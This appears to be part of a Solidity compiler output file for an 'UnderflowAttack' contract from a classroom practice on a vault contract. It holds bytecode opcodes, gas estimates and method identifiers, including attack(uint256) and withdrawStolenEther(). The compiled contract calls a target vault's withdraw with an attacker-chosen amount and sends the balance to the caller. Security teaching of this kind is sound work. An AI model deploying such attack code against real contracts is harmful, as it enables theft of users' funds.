					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x601 CODESIZE SUB DUP1 PUSH2 0x601 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x56D DUP1 PUSH2 0x94 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x24D8E86B EQ PUSH2 0x44 JUMPI DUP1 PUSH4 0x64DD891A EQ PUSH2 0x5B JUMPI DUP1 PUSH4 0xD0E30DB0 EQ PUSH2 0x96 JUMPI PUSH2 0x3F JUMP JUMPDEST CALLDATASIZE PUSH2 0x3F JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x50 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x59 PUSH2 0xA0 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x67 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x94 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x7E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xE9 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x9E PUSH2 0x2A9 JUMP JUMPDEST STOP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0xE6 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD PUSH1 0x24 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x2E1A7D4D00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x1E4 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x1C1 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x246 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x24B JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x2A5 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x2A DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x4E0 PUSH1 0x2A SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x64 CALLVALUE LT ISZERO PUSH2 0x303 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x2E DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x50A PUSH1 0x2E SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLVALUE PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0xD0E30DB000000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x3F4 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x3D1 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x456 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x45B JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x4B5 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x27 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x4B9 PUSH1 0x27 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP INVALID 0x4E PUSH16 0x2068616269646F20657869746F206120 PUSH13 0x6120686F726120646520646570 PUSH16 0x73697461722E456E63696D6120646520 PUSH13 0x616472C3B36E20736F7920746F PUSH15 0x746F2079206E6F2073652061746163 PUSH2 0x7248 PUSH2 0x7320 PUSH5 0x65706F7369 PUSH21 0x61646F20756E612063616E74696461642064656D61 PUSH20 0x6961646F207065717565C3B161A2646970667358 0x22 SLT KECCAK256 0xB3 0x5D 0xA6 SWAP2 LOG1 0xC2 0xD3 PUSH29 0x667FCD099EFDB3E5F550FB23AB55E8C96D5CA43C2FB5F65264736F6C63 NUMBER STOP MOD DIV STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "277800",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack(uint256)": "infinite",
						"deposit()": "infinite",
						"withdrawStolenEther()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack(uint256)": "64dd891a",
					"deposit()": "d0e30db0",
					"withdrawStolenEther()": "24d8e86b"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 301,
						"contract": "PRACTICA 9/CryptoVault2.sol:UnderflowAttack",
						"label": "attackedContract",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}